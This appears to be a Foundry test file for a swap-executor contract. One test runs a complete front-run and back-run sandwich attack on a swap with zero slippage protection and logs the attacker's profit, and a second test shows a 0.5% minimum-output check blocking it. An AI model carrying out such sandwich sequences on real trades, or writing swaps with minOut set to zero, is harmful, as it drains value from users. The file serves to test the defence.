// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ForkBase} from "test/base/ForkBase.sol";
import {SwapExecutor} from "src/SwapExecutor.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/console.sol";

contract SandwichNoSlippageTest is ForkBase {
    SwapExecutor internal executor;

    function setUp() public override {
        super.setUp();
        executor = new SwapExecutor(address(router));
    }

    /// @notice Attack 02: Sandwich attack on swap without slippage protection (minOut = 0) vs protected with minOut
    function test_Attack02_SandwichSucceedsWithoutSlippageProtection() public {
        uint256 victimTradeAmount = 50_000 * 1e6; // Victim swaps 50,000 USDC for WETH
        uint256 attackerFrontrunAmount = 500_000 * 1e6; // Attacker swaps 500,000 USDC

        fund(alice, usdc, victimTradeAmount);
        fund(attacker, usdc, attackerFrontrunAmount);

        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);

        address[] memory reversePath = new address[](2);
        reversePath[0] = address(weth);
        reversePath[1] = address(usdc);

        // Baseline: what would victim receive under peaceful, unmanipulated conditions?
        uint256 fairVictimOut = router.getAmountsOut(victimTradeAmount, path)[1];

        // 1. FRONT-RUN: Attacker buys WETH before victim
        vm.startPrank(attacker);
        usdc.approve(address(router), attackerFrontrunAmount);
        uint256[] memory frontAmounts =
            router.swapExactTokensForTokens(attackerFrontrunAmount, 0, path, attacker, block.timestamp);
        uint256 attackerWethAcquired = frontAmounts[1];
        vm.stopPrank();

        // 2. VICTIM SWAP with minOut = 0 (Unprotected)
        vm.startPrank(alice);
        usdc.approve(address(executor), victimTradeAmount);
        uint256[] memory victimAmounts = executor.swapExactIn(
            path,
            victimTradeAmount,
            0, // VULNERABILITY: minOut = 0
            alice,
            block.timestamp
        );
        uint256 victimActualOut = victimAmounts[1];
        vm.stopPrank();

        // Victim received substantially less WETH than fair market expectation
        assertLt(victimActualOut, fairVictimOut);
        uint256 victimLoss = fairVictimOut - victimActualOut;
        console.log("=== ATTACK 02: SANDWICH EXPLOIT ===");
        console.log("Victim fair output (WETH wei):", fairVictimOut);
        console.log("Victim actual output (WETH wei):", victimActualOut);
        console.log("Victim value extracted (WETH wei):", victimLoss);

        // 3. BACK-RUN: Attacker sells WETH acquired in front-run back for USDC
        vm.startPrank(attacker);
        weth.approve(address(router), attackerWethAcquired);
        uint256[] memory backAmounts =
            router.swapExactTokensForTokens(attackerWethAcquired, 0, reversePath, attacker, block.timestamp);
        uint256 attackerFinalUsdc = backAmounts[1];
        vm.stopPrank();

        assertGt(attackerFinalUsdc, attackerFrontrunAmount, "Attacker must profit from sandwich");
        uint256 netProfitUsdc = attackerFinalUsdc - attackerFrontrunAmount;
        console.log("Attacker net profit (USDC):", netProfitUsdc);
        console.log("===================================");
    }

    /// @notice Mitigation: With realistic minOut (e.g. 0.5% slippage tolerance), victim transaction reverts and attack fails
    function test_Attack02_MitigationBlocksSandwich() public {
        uint256 victimTradeAmount = 50_000 * 1e6;
        uint256 attackerFrontrunAmount = 500_000 * 1e6;

        fund(alice, usdc, victimTradeAmount);
        fund(attacker, usdc, attackerFrontrunAmount);

        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);

        // Victim expects fair output based on state before attacker's tx
        uint256 fairVictimOut = router.getAmountsOut(victimTradeAmount, path)[1];
        uint256 reasonableMinOut = (fairVictimOut * 995) / 1000; // 0.5% max slippage

        // 1. Attacker front-runs
        vm.startPrank(attacker);
        usdc.approve(address(router), attackerFrontrunAmount);
        router.swapExactTokensForTokens(attackerFrontrunAmount, 0, path, attacker, block.timestamp);
        vm.stopPrank();

        // 2. Victim swap executes with reasonable minOut -> MUST REVERT
        vm.startPrank(alice);
        usdc.approve(address(executor), victimTradeAmount);
        vm.expectRevert(); // Router UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT or SlippageExceeded
        executor.swapExactIn(path, victimTradeAmount, reasonableMinOut, alice, block.timestamp);
        vm.stopPrank();

        console.log("Sandwich mitigated: Victim transaction successfully reverted with reasonable minOut.");
    }
}
